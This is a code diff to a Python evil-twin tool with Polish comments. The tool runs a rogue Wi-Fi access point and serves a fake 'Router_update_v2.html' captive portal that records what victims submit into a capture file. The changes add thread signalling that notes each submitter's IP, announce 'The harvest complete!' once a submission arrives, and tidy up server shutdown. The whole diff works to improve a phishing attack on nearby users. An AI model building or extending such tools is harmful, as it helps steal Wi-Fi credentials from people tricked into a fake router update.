@@ -19,6 +19,7 @@ COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
 COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
 COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
 COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
+COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
 
 
 def color_text(text, color):
@@ -39,6 +40,9 @@ LEASE_TIME = "12h"
 PORTAL_HTML = None
 PORTAL_HTML_PATH = os.path.join(os.path.dirname(__file__), "Router_update_v2.html")
 CAPTURE_FILE_PATH = None
+SUBMISSION_EVENT = threading.Event()
+SUBMISSION_LOCK = threading.Lock()
+LAST_SUBMISSION_IP = None
 
 # HTML dla captive portal - miejsce na base64
 HTML_PAGE = """<!DOCTYPE html>
@@ -258,7 +262,10 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         post_data = self.rfile.read(content_length)
         decoded = post_data.decode("utf-8", errors="replace")
         parsed = parse_qs(decoded)
-        logging.info("Portal submission from %s", self.client_address[0])
+        global LAST_SUBMISSION_IP
+        with SUBMISSION_LOCK:
+            LAST_SUBMISSION_IP = self.client_address[0]
+        SUBMISSION_EVENT.set()
 
         if CAPTURE_FILE_PATH:
             timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
@@ -432,6 +439,7 @@ def main():
     import atexit
     atexit.register(cleanup)
     
+    http_server = None
     try:
         # Uruchom Access Point
         hostapd_proc, dnsmasq_proc = setup_ap()
@@ -457,7 +465,21 @@ def main():
         # Główna pętla
         while True:
             time.sleep(1)
-            
+
+            if SUBMISSION_EVENT.is_set():
+                with SUBMISSION_LOCK:
+                    SUBMISSION_EVENT.clear()
+
+                logging.info(color_text("The harvest complete!", COLOR_SUCCESS))
+                while True:
+                    exit_choice = input("Exit script? (Y/N): ").strip().lower()
+                    if exit_choice in {"y", "n"}:
+                        break
+                    logging.warning("Please enter Y or N.")
+
+                if exit_choice == "y":
+                    break
+
             # Sprawdź czy procesy działają
             for i, proc in enumerate(processes):
                 if proc and proc.poll() is not None:
@@ -470,6 +492,9 @@ def main():
     except Exception as e:
         logging.error(f"Unexpected error: {e}")
     finally:
+        if http_server:
+            http_server.shutdown()
+            http_server.server_close()
         cleanup()
 
 if __name__ == "__main__":
